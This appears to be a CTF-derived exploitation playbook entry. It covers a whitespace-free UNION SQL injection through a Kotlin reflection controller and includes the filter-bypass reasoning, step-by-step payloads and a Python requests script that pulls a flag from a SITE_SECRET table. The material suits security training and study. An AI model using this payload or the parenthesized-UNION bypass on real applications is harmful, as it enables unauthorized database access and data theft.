---
name: reflection_method_invocation_union_sqli
vuln_type: sqli
sub_technique: reflection_method_invocation
category: exploitation
safety_level: safe
---

# Kotlin Reflection Controller Invokes Dataprovider Methods With User-Controlled Params → Whitespace-Free Union Sqli

## When to Apply

A Kotlin/Spring application exposes an API endpoint that uses reflection (`KCallable.call()`) to dynamically invoke methods on a DataProvider class based on user-controlled parameters. The method name (`s`), query (`q`), and a magic parameter (`mp`) are all taken from request params. A `filterQuery()` function blocks whitespace, `runtime`, `java`, `/`, `*`, `%`, `DROP`, `DELETE`, and enforces max length 40. However, SQL parenthesized syntax `UNION(SELECT(col)FROM(table))` contains no whitespace and bypasses all filters. The reflection controller splits the query by spaces and selects a token by index (depending on `magicParam` type), allowing the attacker to position the SQLi payload at the correct split index.

## Prerequisites

- API endpoint uses Kotlin reflection to call DataProvider methods by name
- Method name, query, and magic param are all user-controlled request parameters
- ReflectionController splits query by space and selects token by index based on magicParam type
- DataProvider.selectQuery() appends user input to a base SELECT query
- filterQuery() blocks whitespace but not SQL keywords (UNION, SELECT, FROM) or parentheses
- H2 (or compatible) database supports parenthesized SQL syntax
- Admin role required (obtained via separate auth bypass)
- Session activation step required (e.g., /api/v6/.../query?q=Y)

## Steps

1. Obtain ROLE_ADMIN via auth bypass (e.g., NPE role escalation)\n2. Activate session: `GET /api/v6/shieldosint/query?q=Y`\n3. Craft UNION SQLi with no whitespace:\n   `s=selectQuery` (method to invoke via reflection)\n   `q=a a UNION(SELECT(sdata)FROM(SITE_SECRET))` (3 space-separated tokens)\n   `mp=a` (String type → split by space, take index 2)\n4. ReflectionController splits q by space → index[2] = `UNION(SELECT(sdata)FROM(SITE_SECRET))`\n5. DataProvider.selectQuery() runs filterQuery() on the extracted token:\n   - No whitespace ✓, no blocked keywords ✓, length ≤ 40 ✓\n6. Final SQL: `SELECT SUBJECT FROM QUESTION WHERE ID>=1 and ID<=10 UNION(SELECT(sdata)FROM(SITE_SECRET))`\n7. Flag returned in response

## Code Template

```
import requests\nfrom bs4 import BeautifulSoup\nsession = requests.Session()\n# After signup + admin login (NPE trick)\nsession.get(f'{URL}/api/v6/shieldosint/query?q=Y')  # activate session\nr = session.get(f'{URL}/api/v6/shieldosint/search', params={\n    's': 'selectQuery',\n    'q': 'a a UNION(SELECT(sdata)FROM(SITE_SECRET))',\n    'mp': 'a'\n})\nprint(r.text)  # flag from SITE_SECRET.sdata
```

## Examples

### Example 1

- **reflection_api**: KCallable.call(instance, finalQuery) invokes DataProvider.selectQuery()
- **split_logic**: String magicParam → query.split(' ')[2]; Int → .last(); Boolean → .first()
- **filter_bypass**: UNION(SELECT(col)FROM(table)) — no whitespace, no blocked chars, ≤40 chars
- **database**: H2 in-memory DB (jdbc:h2:~/testdb) — supports parenthesized SQL
- **target_table**: SITE_SECRET (sdata column contains the flag)

The combination of reflection-based method invocation and whitespace-free SQL injection is the key insight. The reflection controller allows calling any declared function on DataProvider by name, and the split-by-space logic lets the attacker control which token is passed to the SQL query. The parenthesized UNION syntax `UNION(SELECT(col)FROM(table))` is valid SQL in H2/MySQL and bypasses whitespace-based WAF/filter patterns. The magicParam type determines the split index: String=index[2], Int=last(), Boolean=first().
